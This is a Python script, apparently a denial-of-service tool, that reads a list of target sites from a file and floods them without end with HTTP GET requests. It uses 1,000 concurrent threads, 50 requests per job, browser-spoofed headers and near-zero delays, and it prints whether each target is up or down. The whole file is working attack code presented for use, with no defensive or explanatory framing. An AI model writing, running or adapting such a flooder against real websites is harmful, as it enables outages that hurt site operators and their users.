import time

import requests
from concurrent.futures import ThreadPoolExecutor

headers = {
    "Content-Type": "text/html",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
    "Cache-Control": "max-age=0",
    'Connection': 'keep-alive',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
}


def ping(site_url: str):
    try:
        response = requests.get(site_url, headers=headers)
        if response.status_code == 200:
            print(f"UP   \t\t: {site_url} ")
        elif response.status_code >= 500:
            print(f"DOWN {response.status_code} \t: {site_url} ")
        else:
            print(f"Code {response.status_code} \t: {site_url} ")
    except Exception as e:
        failure = str(e)
        if "Connection aborted" in failure:
            print(f"DOWN \t\t: {site_url} \t\t Connection aborted ")
        elif "Max retries exceeded" in failure:
            print(f"DOWN \t\t: {site_url} \t\t Max retries exceeded ")
        else:
            print(f"DOWN \t\t: {site_url} \t\t {failure[:140]} ")


def ping_times(site_url: str, times: int):
    for i in range(times):
        ping(site_url)
        time.sleep(0.001)


if __name__ == '__main__':
    with open("sites.txt") as infile:
        try:
            sites = [line.strip() for line in infile.readlines() if not line.startswith('#') and not line == '']
            print(sites)
        except IOError:
            print("Failed to read sites list ")
    start = time.time()
    with ThreadPoolExecutor(max_workers=1_000) as executor:
        while True:
            for url in sites:
                executor.submit(lambda: ping_times(url, 50))
                time.sleep(0.001)
